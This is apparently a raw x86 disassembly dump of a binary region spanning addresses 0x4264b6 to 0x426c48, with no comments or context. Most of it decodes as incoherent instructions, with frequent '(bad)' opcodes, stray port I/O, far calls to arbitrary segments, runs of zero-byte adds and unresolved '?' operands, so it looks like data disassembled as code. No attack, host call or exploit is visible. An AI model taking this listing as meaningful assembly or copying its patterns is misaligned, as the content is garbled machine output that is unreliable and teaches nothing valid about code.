  4264b6:	push   cs
  4264b7:	(bad)  
  4264b8:	iret   
  4264b9:	mov    gs,WORD PTR [esi]
  4264bb:	bound  esi,QWORD PTR [ecx+edx*4]
  4264be:	push   edx
  4264bf:	int    0x73
  4264c1:	xor    ah,bl
  4264c3:	mov    ecx,0x2992f92c
  4264c8:	scas   eax,DWORD PTR es:[edi]
  4264c9:	mov    al,0x98
  4264cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264cc:	test   BYTE PTR [esi+0x314df594],cl
  4264d2:	push   esp
  4264d3:	(bad)  
  4264d4:	leave  
  4264d5:	jl     0x4264dc
  4264d7:	imul   esi,edx,0x9d966c
  4264dd:	add    BYTE PTR [eax],al
  4264df:	add    BYTE PTR [eax],al
  4264e1:	push   edi
  4264e2:	mov    eax,0xe6746c1d
  4264e7:	in     al,dx
  4264e8:	ficom  WORD PTR [edi]
  4264ea:	jle    0x42651e
  4264ec:	std    
  4264ed:	push   ss
  4264ee:	dec    esi
  4264ef:	xor    cl,BYTE PTR [ecx]
  4264f1:	mov    ebx,ds
  4264f3:	and    eax,0x8ded33b8
  4264f8:	ret    0xbd96
  4264fb:	xchg   ebx,eax
  4264fc:	xor    eax,0x6aeced1a
  426501:	stos   BYTE PTR es:[edi],al
  426502:	scas   al,BYTE PTR es:[edi]
  426503:	push   cs
  426504:	nop
  426505:	sahf   
  426506:	in     al,dx
  426507:	in     al,dx
  426508:	sahf   
  426509:	push   ss
  42650a:	je     0x426511
  42650c:	add    ecx,DWORD PTR [ebp-0x79cf6872]
  426512:	repz not BYTE PTR [esp+edx*4-0x4e]
  426517:	push   cs
  426518:	jae    0x426574
  42651a:	lds    esi,FWORD PTR [edx]
  42651c:	pop    esp
  42651d:	mov    al,ds:0x8c48f7bf
  426522:	mov    dl,0xe
  426524:	jae    0x426580
  426526:	lds    ebx,FWORD PTR [ecx+0x32a0afcd]
  42652c:	jg     0x4264ae
  42652e:	(bad)  
  42652f:	idiv   DWORD PTR [eax-0x74]
  426532:	mov    dl,0xe
  426534:	add    BYTE PTR [ebx],al
  426536:	jge    0x426539
  426538:	and    al,0xdf
  42653a:	ret    0xe900
  42653d:	in     al,dx
  42653e:	scas   al,BYTE PTR es:[edi]
  42653f:	push   cs
  426540:	add    bl,dh
  426542:	jl     0x426545
  426544:	and    al,0x0
  426546:	add    BYTE PTR [eax],al
  426548:	add    BYTE PTR [eax],al
  42654a:	cld    
  42654b:	ret    0x8813
  42654e:	das    
  42654f:	in     eax,dx
  426550:	xor    edi,ebp
  426552:	nop
  426553:	inc    ebx
  426554:	fdivp  st(7),st
  426556:	xchg   BYTE PTR [eax],bh
  426558:	push   eax
  426559:	pop    ss
  42655a:	pop    ebp
  42655b:	ins    BYTE PTR es:[edi],dx
  42655c:	sbb    bl,BYTE PTR [eax]
  42655e:	mov    ds:0x5e469497,al
  426563:	rcl    BYTE PTR [ebx+0x4c19320c],1
  426569:	mov    bh,BYTE PTR [edi-0x15]
  42656c:	xor    BYTE PTR [ebp+0x59f5c335],cl
  426572:	mov    dl,0x1
  426574:	mul    bl
  426576:	sub    BYTE PTR [esi+ecx*1+0x18c03985],dh
  42657d:	imul   bh
  42657f:	mov    al,0x74
  426581:	add    al,0xa1
  426583:	cwde   
  426584:	call   FWORD PTR [eax-0x2a]
  426587:	outs   dx,DWORD PTR ds:[esi]
  426588:	iret   
  426589:	jmp    0x426585
  42658b:	add    BYTE PTR [ebp+0x32a76240],ch
  426591:	adc    al,0x71
  426593:	jns    0x4265a4
  426595:	mov    ebp,DWORD PTR [edx-0x393f6e1a]
  42659b:	das    
  42659c:	mov    ecx,0x951446fb
  4265a1:	into   
  4265a2:	inc    esi
  4265a3:	and    edx,DWORD PTR [ebx-0x72d02940]
  4265a9:	sti    
  4265aa:	ss adc al,0x94
  4265ad:	inc    esi
  4265ae:	add    BYTE PTR [eax],al
  4265b0:	add    BYTE PTR [eax],al
  4265b2:	add    BYTE PTR [esi-0x6ff37031],bl
  4265b8:	fcomp  DWORD PTR [eax+0x65727f42]
  4265be:	test   DWORD PTR [edi-0x60bd6490],0xa70c69ad
  4265c8:	je     0x4265e2
  4265ca:	xchg   dh,cl
  4265cc:	add    ch,dh
  4265ce:	cwde   
  4265cf:	pushf  
  4265d0:	mov    dl,0x9a
  4265d2:	inc    edx
  4265d3:	jg     0x426638
  4265d5:	push   edi
  4265d6:	adc    ebp,DWORD PTR [eax]
  4265d8:	inc    eax
  4265d9:	add    BYTE PTR [ebp-0x44f4721],al
  4265df:	je     0x42662e
  4265e1:	sbb    eax,0xb044391c
  4265e6:	sti    
  4265e7:	aas    
  4265e8:	pop    esp
  4265e9:	std    
  4265ea:	cmp    eax,0x3df84890
  4265ef:	nop
  4265f0:	cmp    bl,dh
  4265f2:	cmp    eax,0x3dde1690
  4265f7:	nop
  4265f8:	std    
  4265f9:	fnstsw WORD PTR ds:0x3dfc0790
  4265ff:	nop
  426600:	mov    ecx,0xeb903dfd
  426605:	sti    
  426606:	cmp    eax,0x3dfd9790
  42660b:	nop
  42660c:	jo     0x42660b
  42660e:	cmp    eax,0x3dfd8890
  426613:	nop
  426614:	icebp  
  426615:	cld    
  426616:	cmp    eax,0x0
  42661b:	add    BYTE PTR [eax-0x6fc22114],dl
  426621:	mov    fs,eax
  426623:	cmp    eax,0x3de06490
  426628:	nop
  426629:	test   al,ah
  42662b:	cmp    eax,0x3de09d90
  426630:	nop
  426631:	push   esp
  426632:	fistp  QWORD PTR ds:0xd446b290
  426638:	gs mov dl,0x8
  42663b:	rcr    DWORD PTR [ebp-0x4e],cl
  42663e:	or     bl,dl
  426640:	push   ebp
  426641:	mov    dl,0x8
  426643:	ror    ebp,cl
  426645:	mov    dl,0xe8
  426647:	rol    ch,cl
  426649:	mov    dl,0xe8
  42664b:	sar    BYTE PTR [ebp-0x4a2d174e],cl
  426651:	mov    dl,0xb3
  426653:	shr    BYTE PTR [ebp-0x5a2d444e],cl
  426659:	mov    dl,0xc8
  42665b:	rcr    BYTE PTR [ebp-0x6a2d444e],cl
  426661:	mov    dl,0xb3
  426663:	ror    BYTE PTR [ebp-0x7a2d444e],cl
  426669:	mov    dl,0xb3
  42666b:	sar    BYTE PTR [ebp-0x4e],cl
  42666e:	mov    ebx,0xb3b275d2
  426673:	shr    BYTE PTR [ebp-0x4e],cl
  426676:	mov    bl,0xd2
  426678:	gs mov dl,0xa4
  42667b:	rcr    BYTE PTR [ebp-0x4e],cl
  42667e:	into   
  42667f:	rol    BYTE PTR [eax],cl
  426681:	add    BYTE PTR [eax],al
  426683:	add    BYTE PTR [eax],al
  426685:	push   ebp
  426686:	mov    dl,0xc0
  426688:	ror    ch,cl
  42668a:	mov    dl,0xe2
  42668c:	aad    0xc5
  42668e:	mov    dl,0xcc
  426690:	aad    0xbd
  426692:	mov    dl,0x37
  426694:	(bad)  
  426695:	mov    ch,0xb2
  426697:	or     esi,edx
  426699:	lods   eax,DWORD PTR ds:[esi]
  42669a:	mov    dl,0x8
  42669c:	(bad)  
  42669d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42669e:	mov    dl,0x7c
  4266a0:	aad    0x9d
  4266a2:	mov    dl,0x78
  4266a4:	call   0xd596193e
  4266a9:	lea    esi,[edx-0x4d7a285b]
  4266af:	jo     0x426699
  4266b1:	jge    0x426665
  4266b3:	push   cs
  4266b4:	jae    0x42665e
  4266b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266b7:	push   cs
  4266b8:	fwait
  4266b9:	(bad)  
  4266ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266bb:	push   cs
  4266bc:	cwde   
  4266bd:	leave  
  4266be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266bf:	push   cs
  4266c0:	xor    al,0xb9
  4266c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266c3:	push   cs
  4266c4:	mov    eax,ds:0xba0ea7b8
  4266c9:	push   0x7bde0ea7
  4266ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266cf:	push   cs
  4266d0:	repz pop ecx
  4266d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266d3:	push   cs
  4266d4:	mov    al,0x58
  4266d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266d7:	push   cs
  4266d8:	sbb    BYTE PTR [eax-0x59],cl
  4266db:	push   cs
  4266dc:	ror    BYTE PTR [ebx-0x59],cl
  4266df:	push   cs
  4266e0:	pushf  
  4266e1:	imul   esp,DWORD PTR [edi-0x58c68cf2],0xe
  4266e8:	int3   
  4266e9:	add    BYTE PTR [eax],al
  4266eb:	add    BYTE PTR [eax],al
  4266ed:	add    BYTE PTR [edi],bh
  4266ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266f0:	push   cs
  4266f1:	xor    ebx,DWORD PTR [ebp-0x59]
  4266f4:	push   cs
  4266f5:	sbb    eax,0x70ea765
  4266fa:	pop    ebp
  4266fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266fc:	push   cs
  4266fd:	fild   WORD PTR [edi+eiz*4+0xe]
  426701:	cs inc ebx
  426703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426704:	push   cs
  426705:	bound  eax,QWORD PTR [ebx-0x59]
  426708:	push   cs
  426709:	call   0xa6e3:0xbc0ea743
  426710:	push   cs
  426711:	or     al,0xe8
  426713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426714:	push   cs
  426715:	add    al,0xd8
  426717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426718:	push   cs
  426719:	or     al,0xd8
  42671b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42671c:	push   cs
  42671d:	add    al,0xc8
  42671f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426720:	push   cs
  426721:	cmp    bl,BYTE PTR [esi-0x218c20d3]
  426727:	loop   0x4266f9
  426729:	jmp    0xbe5e:0x561da47f
  426730:	inc    ebp
  426731:	add    BYTE PTR [edx-0x11],al
  426734:	jae    0x42679a
  426736:	xor    BYTE PTR [ebp+0x319effe1],ah
  42673c:	out    0x1,al
  42673e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42673f:	shl    DWORD PTR [esp+ecx*8+0x660eb0b9],cl
  426746:	jb     0x42673e
  426748:	popa   
  426749:	and    eax,0x6671ee2a
  42674e:	mov    ds:0x1d61f6,al
  426753:	add    BYTE PTR [eax],al
  426755:	add    BYTE PTR [eax],al
  426757:	mov    ecx,0xaaf5ec17
  42675c:	into   
  42675d:	popa   
  42675e:	adc    eax,0x750eefb7
  426763:	dec    ecx
  426764:	cmp    DWORD PTR [eax+0x8],ebx
  426767:	pop    edx
  426768:	jbe    0x426784
  42676a:	xor    DWORD PTR [eax+0x3a056343],0xfffffff0
  426771:	dec    ebp
  426772:	jmp    0x4267af
  426774:	add    DWORD PTR [ebp+0x3cf0f25e],ebp
  42677a:	rcl    BYTE PTR [edi],0x7
  42677d:	dec    esi
  42677e:	adc    BYTE PTR [edi-0x7c68f4b],dh
  426784:	loope  0x4267e4
  426786:	or     BYTE PTR [edi-0x51],al
  426789:	(bad)  
  42678a:	jae    0x4267ad
  42678c:	add    DWORD PTR [ebp+0x16af37c3],ebp
  426792:	je     0x426775
  426794:	pop    ss
  426795:	cwde   
  426796:	dec    esi
  426798:	inc    esp
  426799:	loope  0x426773
  42679b:	repnz out dx,eax
  42679d:	dec    ebp
  42679e:	ret    
  42679f:	cwde   
  4267a0:	lahf   
  4267a1:	inc    ebx
  4267a2:	push   esi
  4267a3:	xchg   BYTE PTR [edi],dh
  4267a5:	push   0x24
  4267a7:	lea    ebx,[eax-0x59ff74e3]
  4267ad:	je     0x4267b5
  4267af:	nop
  4267b0:	or     cl,dl
  4267b2:	pop    ecx
  4267b3:	sbb    esi,eax
  4267b5:	neg    BYTE PTR [ebx]
  4267b7:	and    DWORD PTR [edx],0xffffff9a
  4267ba:	add    eax,DWORD PTR [eax]
  4267bc:	add    BYTE PTR [eax],al
  4267be:	add    BYTE PTR [eax],al
  4267c0:	or     eax,0xb40f6ce
  4267c5:	aas    
  4267c6:	call   0x97e7:0xc8097444
  4267cd:	pop    eax
  4267ce:	add    BYTE PTR [bx+si-0x6927],dl
  4267d3:	ud2    
  4267d5:	mov    WORD PTR [ecx-0x738b866a],?
  4267db:	xchg   DWORD PTR [eax-0xe374a8],eax
  4267e1:	mov    ah,0x6
  4267e3:	jbe    0x4267a8
  4267e5:	xchg   edx,eax
  4267e6:	push   edx
  4267e7:	aaa    
  4267e8:	popa   
  4267e9:	sbb    eax,0xe5667ee8
  4267ee:	add    al,0x1d
  4267f0:	(bad)  
  4267f2:	(bad)  
  4267f3:	cli    
  4267f4:	js     0x426831
  4267f6:	aaa    
  4267f7:	jg     0x426847
  4267f9:	loop   0x4267ff
  4267fb:	adc    ebp,DWORD PTR ss:[ebx+0x58b073e7]
  426802:	mov    edx,DWORD PTR [edi]
  426804:	mov    esp,0x39c19829
  426809:	jg     0x42681c
  42680b:	add    BYTE PTR [eax+0x75e7d9c8],dl
  426811:	pusha  
  426812:	aam    0x7f
  426814:	sub    dh,bl
  426816:	add    al,0x17
  426818:	pop    eax
  426819:	jge    0x426801
  42681b:	inc    edi
  42681c:	jl     0x4267b7
  42681e:	pop    edx
  42681f:	je     0x4267ab
  426821:	mov    eax,ds:0x3606
  426826:	add    BYTE PTR [eax],al
  426828:	add    BYTE PTR [eax-0x5a],cl
  42682b:	add    BYTE PTR [esi-0x6b],ah
  42682e:	lock pop ss
  426830:	data16 mov WORD PTR [edx-0x5089f980],?
  426837:	add    BYTE PTR [edx],0x6e
  42683a:	mov    al,0x1e
  42683c:	fstp   DWORD PTR [ebx-0x72]
  42683f:	sti    
  426840:	push   ss
  426841:	xchg   ebx,eax
  426842:	dec    esp
  426843:	xchg   esp,eax
  426844:	dec    eax
  426845:	or     ebp,DWORD PTR [eax+eax*4-0x3010f107]
  42684c:	(bad)  
  42684d:	xor    bh,BYTE PTR [ecx]
  42684f:	xor    ecx,DWORD PTR [ebp+0x44379f8c]
  426855:	xor    bh,BYTE PTR [ecx]
  426857:	mov    bl,0x8c
  426859:	xchg   edx,eax
  42685a:	dec    esp
  42685b:	sub    BYTE PTR [ecx+ebx*1-0xdffec91],ah
  426862:	stos   DWORD PTR es:[edi],eax
  426863:	cld    
  426864:	ror    BYTE PTR [eax+0x74],1
  426867:	mov    eax,0xc796dbd8
  42686c:	or     al,0xee
  42686e:	pop    eax
  42686f:	cmp    al,0x9d
  426871:	imul   esi,DWORD PTR [eax],0xffffffbd
  426874:	stos   DWORD PTR es:[edi],eax
  426875:	(bad)  
  426877:	repnz adc eax,0x7fbe906
  42687d:	les    ecx,FWORD PTR [esi-0x512cab34]
  426883:	or     DWORD PTR [ecx],0x380f73f
  426889:	loopne 0x42686c
  42688b:	leave  
  42688c:	pop    ss
  42688d:	add    BYTE PTR [eax],al
  42688f:	add    BYTE PTR [eax],al
  426891:	add    BYTE PTR [edx+0x4c80f772],al
  426897:	scas   eax,DWORD PTR es:[edi]
  426898:	xor    bl,BYTE PTR [ebp+0x15f7b31b]
  42689e:	test   DWORD PTR [ebp-0x4f08bc49],esp
  4268a4:	or     bl,cl
  4268a6:	push   ecx
  4268a7:	retf   
  4268a8:	pop    ecx
  4268a9:	popf   
  4268aa:	sti    
  4268ab:	loope  0x426901
  4268ad:	mov    edx,DWORD PTR [ebx-0x4c]
  4268b0:	push   cs
  4268b1:	cli    
  4268b2:	sar    DWORD PTR [ebp+0x4c],cl
  4268b5:	or     al,0xa9
  4268b7:	jnp    0x426889
  4268b9:	icebp  
  4268ba:	xchg   ebx,eax
  4268bb:	test   BYTE PTR [ecx+0x1a5d1098],bl
  4268c1:	jmp    0x1830146d
  4268c6:	mov    al,ds:0xc3c502dd
  4268cb:	mov    eax,ds:0x7cc5720e
  4268d0:	mul    DWORD PTR [ebx+0x16ecdd98]
  4268d6:	sbb    esp,ebx
  4268d8:	cmc    
  4268d9:	sbb    al,0x89
  4268db:	fucomp st(4)
  4268dd:	shl    DWORD PTR gs:[esi+0x29],cl
  4268e1:	mov    edi,0x6a1a651e
  4268e6:	gs loope 0x426949
  4268e9:	icebp  
  4268ea:	sbb    al,0xa4
  4268ec:	in     eax,dx
  4268ed:	aam    0x57
  4268ef:	mov    cl,0x4e
  4268f1:	jmp    0xdd74c706
  4268f6:	add    BYTE PTR [eax],al
  4268f8:	add    BYTE PTR [eax],al
  4268fa:	add    BYTE PTR [ebx-0x5640d19a],dl
  426900:	mov    dl,0x78
  426902:	jmp    0xe9522fb2
  426907:	xchg   ebx,eax
  426908:	frstor [ecx-0x3b]
  42690b:	inc    edi
  42690c:	fsub   QWORD PTR [esi+eax*1]
  42690f:	inc    esi
  426910:	test   eax,0x3793a8fe
  426915:	into   
  426916:	jl     0x4268ad
  426918:	xchg   ebx,eax
  426919:	adc    al,0xbb
  42691b:	push   ebx
  42691c:	(bad)  [edi]
  42691e:	cdq    
  42691f:	xchg   ebp,eax
  426920:	jl     0x42696f
  426922:	stos   DWORD PTR es:[edi],eax
  426923:	test   BYTE PTR [edx-0x7cc79dbd],dh
  426929:	aas    
  42692a:	push   0xffffffa5
  42692c:	scas   al,BYTE PTR es:[edi]
  42692d:	push   cs
  42692e:	add    BYTE PTR [esi],ch
  426930:	jae    0x42691c
  426932:	add    al,0xe9
  426934:	mov    ah,0xe
  426936:	je     0x4268d7
  426938:	nop
  426939:	push   cs
  42693a:	lea    ebp,[edx+edi*1+0x3eac8d3e]
  426941:	ds push 0xffffffe0
  426944:	cmp    ebx,DWORD PTR [edi+0xc]
  426947:	es jecxz 0x42696a
  42694a:	adc    BYTE PTR [ecx-0x4a],bh
  42694d:	xchg   ebx,eax
  42694e:	sar    BYTE PTR [ebp+0x357d6da9],0xb2
  426955:	arpl   WORD PTR [edi],ax
  426957:	xor    dh,BYTE PTR [ebx-0x1a]
  42695a:	test   al,0xae
  42695c:	mov    al,0xec
  42695e:	xor    al,BYTE PTR [eax]
  426960:	add    BYTE PTR [eax],al
  426962:	add    BYTE PTR [eax],al
  426964:	imul   ebx,DWORD PTR [edi+0x6d],0xacb7aee2
  42696b:	shl    ecx,0xb7
  42696e:	xlat   BYTE PTR ds:[ebx]
  42696f:	ret    
  426970:	dec    edx
  426971:	mov    ds:0x88e1e995,eax
  426976:	jmp    0x4a72207a
  42697b:	and    al,0x49
  42697d:	add    ebp,eax
  42697f:	je     0x4269ee
  426981:	push   es
  426982:	lods   eax,DWORD PTR ds:[esi]
  426983:	jmp    0x4269a4
  426985:	xor    DWORD PTR [edx+0x24],ebx
  426988:	mov    gs:0x2e91d395,al
  42698e:	push   ebp
  42698f:	add    BYTE PTR [ecx],bh
  426991:	xor    esi,ebx
  426993:	test   DWORD PTR [edi],edi
  426995:	ret    
  426996:	adc    dh,BYTE PTR [edx]
  426998:	imul   ecx,DWORD PTR [edi],0x3d0a8d29
  42699e:	in     eax,dx
  42699f:	aad    0xfe
  4269a1:	xor    al,ch
  4269a3:	cmp    edi,DWORD PTR [ebx]
  4269a5:	leave  
  4269a6:	sbb    BYTE PTR [edx-0x77e6d1d5],cl
  4269ac:	nop
  4269ad:	ror    BYTE PTR [edi-0x78],1
  4269b0:	call   0x3b1b:0x82f5cd93
  4269b7:	add    BYTE PTR [edx-0x37],ch
  4269ba:	xchg   DWORD PTR [ebp-0x64],esi
  4269bd:	mov    esp,0xd55dfb20
  4269c2:	xchg   DWORD PTR ds:0x50d9a0,edx
  4269c8:	add    BYTE PTR [eax],al
  4269ca:	add    BYTE PTR [eax],al
  4269cc:	add    BYTE PTR ds:0xebf38972,al
  4269d2:	jecxz  0x42697f
  4269d4:	xchg   esi,edx
  4269d6:	das    
  4269d7:	aam    0xe8
  4269d9:	shl    BYTE PTR [ebx+0xd0a0012],0x28
  4269e0:	pop    edx
  4269e1:	dec    ebp
  4269e2:	(bad)  
  4269e3:	aam    0xc
  4269e5:	nop
  4269e6:	addr16 push cs
  4269e8:	adc    BYTE PTR [ebx],dl
  4269ea:	push   cs
  4269eb:	adc    DWORD PTR [ecx],eax
  4269ed:	sbb    eax,0x8ba2091
  4269f2:	dec    esp
  4269f3:	sub    eax,0xde70de00
  4269f8:	out    dx,eax
  4269f9:	mov    ds:0x8df21109,al
  4269fe:	stc    
  4269ff:	xchg   ebx,eax
  426a00:	inc    esp
  426a01:	nop
  426a02:	retf   0x15fd
  426a05:	js     0x4269f6
  426a07:	adc    BYTE PTR [eax],al
  426a09:	nop
  426a0a:	dec    ebp
  426a0b:	shl    DWORD PTR [ecx+eax*4+0x49],1
  426a0f:	push   ss
  426a10:	adc    BYTE PTR [ebx],dl
  426a12:	or     eax,0xd64f0111
  426a17:	cld    
  426a18:	jle    0x4269ee
  426a1a:	leave  
  426a1b:	ja     0x4269d9
  426a1d:	ror    cl,1
  426a1f:	push   ds
  426a20:	sti    
  426a21:	test   DWORD PTR [ecx+0x2f903fe3],esi
  426a27:	aam    0x52
  426a29:	arpl   WORD PTR [edx-0x775fd133],si
  426a2f:	aas    
  426a30:	ins    BYTE PTR es:[edi],dx
  426a31:	add    BYTE PTR [eax],al
  426a33:	add    BYTE PTR [eax],al
  426a35:	add    BYTE PTR [edi+0x76],dh
  426a38:	test   DWORD PTR [edx+0x405012bd],0x5fea2990
  426a42:	outs   dx,DWORD PTR ds:[esi]
  426a43:	jbe    0x426a3c
  426a45:	cwde   
  426a46:	test   DWORD PTR [edx-0x33],edx
  426a49:	inc    ebx
  426a4a:	nop
  426a4b:	xor    esi,DWORD PTR [ebx-0x503b24f8]
  426a51:	hlt    
  426a52:	xchg   edi,eax
  426a53:	mov    dl,0x58
  426a55:	aam    0x3b
  426a57:	jbe    0x426a50
  426a59:	sub    ebp,DWORD PTR [eax-0x44fbccb2]
  426a5f:	les    edi,FWORD PTR [ebx-0xa]
  426a62:	ja     0x426a16
  426a64:	pop    esi
  426a65:	iret   
  426a66:	imul   esp,DWORD PTR [ebx+0x3b],0x4
  426a6a:	sbb    DWORD PTR [ebp-0x4dabeb5d],esp
  426a70:	pop    esi
  426a71:	iret   
  426a72:	dec    edi
  426a73:	arpl   WORD PTR [ebx-0x4857e6fd],si
  426a79:	adc    al,0xcc
  426a7b:	mov    dl,0x6e
  426a7d:	iret   
  426a7e:	shl    DWORD PTR [ecx-0x45],cl
  426a81:	add    ecx,DWORD PTR [ecx]
  426a83:	test   al,0xd3
  426a85:	daa    
  426a86:	aam    0xb2
  426a88:	outs   dx,BYTE PTR ds:[esi]
  426a89:	iret   
  426a8a:	mov    bh,0x61
  426a8c:	mov    bl,0x3
  426a8e:	or     DWORD PTR [eax-0x4d33eb11],ebp
  426a94:	inc    edi
  426a95:	add    ebp,edx
  426a97:	icebp  
  426a98:	push   cs
  426a99:	dec    ecx
  426a9a:	add    BYTE PTR [eax],al
  426a9c:	add    BYTE PTR [eax],al
  426a9e:	add    BYTE PTR [ebx-0x22],cl
  426aa1:	sbb    ebp,DWORD PTR [esi]
  426aa3:	xchg   ecx,eax
  426aa4:	(bad)  [ecx-0x889542d]
  426aaa:	cwde   
  426aab:	test   DWORD PTR [esi+0xe],edi
  426aae:	fcom   st(3)
  426ab0:	mov    dl,0xd1
  426ab2:	xchg   esp,eax
  426ab3:	or     al,0xcf
  426ab5:	mov    ss,ebp
  426ab7:	retf   
  426ab8:	mov    bl,0xe
  426aba:	jmp    0x628687db
  426abf:	and    dh,BYTE PTR [eax]
  426ac1:	adc    DWORD PTR [ecx+0x72ecda19],0xffffffcb
  426ac8:	retf   0x3473
  426acb:	xchg   esp,eax
  426acc:	mov    dl,0x9b
  426ace:	ins    BYTE PTR es:[edi],dx
  426acf:	dec    ebx
  426ad0:	fsubr  st,st(4)
  426ad2:	scas   al,BYTE PTR es:[edi]
  426ad3:	mov    ds:0x73fced80,eax
  426ad8:	lods   al,BYTE PTR ds:[esi]
  426ad9:	dec    esi
  426ada:	jmp    0x6b135668
  426adf:	out    dx,eax
  426ae0:	scas   al,BYTE PTR es:[edi]
  426ae1:	inc    ecx
  426ae2:	xor    al,0xe5
  426ae4:	add    al,0x44
  426ae6:	jb     0x426ab5
  426ae8:	(bad)  
  426ae9:	sti    
  426aea:	push   ss
  426aeb:	sbb    esi,DWORD PTR [edi+0x32]
  426aee:	rcr    DWORD PTR [edx],1
  426af0:	outs   dx,DWORD PTR ds:[esi]
  426af1:	xor    bl,cl
  426af3:	mov    edx,0x89093279
  426af8:	sub    BYTE PTR [esi-0x664d6c18],ch
  426afe:	in     eax,dx
  426aff:	sti    
  426b00:	pop    ebp
  426b01:	sub    ah,BYTE PTR [eax+eax*1]
  426b04:	add    BYTE PTR [eax],al
  426b06:	add    BYTE PTR [eax],al
  426b08:	jmp    0x426b5f
  426b0a:	push   edx
  426b0b:	jmp    0x24449aa3
  426b10:	sti    
  426b11:	push   ebp
  426b12:	push   edx
  426b13:	jmp    0xd574f132
  426b18:	mov    BYTE PTR [edi],dh
  426b1a:	jge    0x426b04
  426b1c:	xchg   ebx,eax
  426b1d:	mov    dl,0x91
  426b1f:	and    DWORD PTR [esi-0x6d606a57],edx
  426b25:	mov    dl,0xe
  426b27:	push   cs
  426b28:	pop    edi
  426b29:	ss call 0x19a1:0xe774e00
  426b31:	xchg   ebp,eax
  426b32:	push   edx
  426b33:	add    BYTE PTR [ebx+0xb],ah
  426b36:	push   cs
  426b37:	add    BYTE PTR [ecx],ch
  426b39:	cs push esi
  426b3b:	sbb    al,0x41
  426b3d:	lods   eax,DWORD PTR ds:[esi]
  426b3e:	jmp    0xde6b5a42
  426b43:	test   edi,esp
  426b45:	mov    ah,0x92
  426b47:	push   ebx
  426b48:	call   0x49e379fd
  426b4d:	mov    dl,BYTE PTR [edx+0x0]
  426b50:	adc    eax,DWORD PTR [esi+0xe]
  426b53:	add    cl,bh
  426b55:	daa    
  426b56:	push   esi
  426b57:	sbb    al,0x6e
  426b59:	xchg   ecx,eax
  426b5a:	test   DWORD PTR [eax-0x17],0x2eff4008
  426b61:	inc    ebp
  426b62:	lea    esp,[eax-0x16f18d6e]
  426b68:	mov    ch,0xb5
  426b6a:	push   cs
  426b6b:	add    BYTE PTR [eax],al
  426b6d:	add    BYTE PTR [eax],al
  426b6f:	add    BYTE PTR [eax],al
  426b71:	dec    eax
  426b72:	xchg   esi,eax
  426b73:	jp     0x426bb9
  426b75:	mov    ecx,0xb900f97a
  426b7a:	mov    al,0x95
  426b7c:	dec    eax
  426b7d:	int    0x8
  426b7f:	and    al,0xff
  426b81:	cs inc ebp
  426b83:	xchg   ebp,eax
  426b84:	lock hlt 
  426b86:	sub    al,0x19
  426b88:	test   BYTE PTR [edi+0xe000eb7],al
  426b8e:	dec    esp
  426b8f:	test   BYTE PTR [eax+0x69],0xf
  426b93:	enter  0x7900,0xb0
  426b97:	xchg   ebp,eax
  426b98:	xor    eax,0x2cccc1
  426b9d:	out    dx,al
  426b9e:	adc    esp,esi
  426ba0:	inc    eax
  426ba1:	imul   ecx,DWORD PTR [edi],0xb03900d8
  426ba7:	xchg   ebp,eax
  426ba8:	xor    eax,0x3fe1b190
  426bad:	nop
  426bae:	ins    BYTE PTR es:[edi],dx
  426baf:	mov    al,0x18
  426bb1:	ror    ecx,cl
  426bb3:	mov    ecx,0x10c990ba
  426bb8:	xchg   DWORD PTR [ebp-0x57],ebx
  426bbb:	loope  0x426bfc
  426bbd:	nop
  426bbe:	mov    esi,?
  426bc0:	sbb    bl,dl
  426bc2:	leave  
  426bc3:	mov    ecx,0x10c990aa
  426bc8:	xchg   DWORD PTR [ebp-0x6fc02013],edi
  426bce:	sub    al,0x1
  426bd0:	sbb    DWORD PTR [ebx-0x37],edx
  426bd3:	mov    ecx,0x9a
  426bd8:	add    BYTE PTR [eax],al
  426bda:	nop
  426bdb:	leave  
  426bdc:	adc    BYTE PTR [esi+0x10c9e3],dh
  426be2:	call   0xd83def14
  426be7:	pusha  
  426be8:	add    DWORD PTR [ebp-0x4793333a],0xbb10c990
  426bf2:	idiv   DWORD PTR [ebp-0x8ecffad]
  426bf8:	dec    esp
  426bf9:	addr16 push esp
  426bfb:	leave  
  426bfc:	adc    BYTE PTR [ebp+0x24],dh
  426bff:	push   eax
  426c00:	push   ebp
  426c01:	and    al,0x80
  426c03:	lahf   
  426c04:	popf   
  426c05:	add    BYTE PTR [eax-0x714d4737],dl
  426c0b:	jl     0x426b91
  426c0d:	lahf   
  426c0e:	sub    al,0xf0
  426c10:	sub    al,0x0
  426c12:	imul   esi,esp,0x46
  426c15:	out    dx,al
  426c16:	nop
  426c17:	leave  
  426c18:	adc    al,ch
  426c1a:	xor    eax,0x1bfb849b
  426c1f:	cdq    
  426c20:	mov    ?,edx
  426c22:	(bad)  
  426c23:	push   ebp
  426c24:	xchg   edx,eax
  426c25:	add    BYTE PTR [eax+0x4356f7b2],dl
  426c2b:	outs   dx,BYTE PTR ds:[esi]
  426c2c:	mov    dh,0x3
  426c2e:	das    
  426c2f:	rep outs dx,DWORD PTR ds:[esi]
  426c31:	rcr    BYTE PTR [edi-0x4fc483c],1
  426c37:	mov    BYTE PTR [bx+di-0x70],al
  426c3b:	(bad)  
  426c3c:	stos   DWORD PTR es:[edi],eax
  426c3d:	mov    al,BYTE PTR [eax]
  426c3f:	add    BYTE PTR [eax],al
  426c41:	add    BYTE PTR [eax],al
  426c43:	pop    ebp
  426c44:	xchg   esi,eax
  426c45:	int    0x43
  426c47:	nop
  426c48:	sbb    esp,DWORD PTR [edx-0x3f4da9d0]
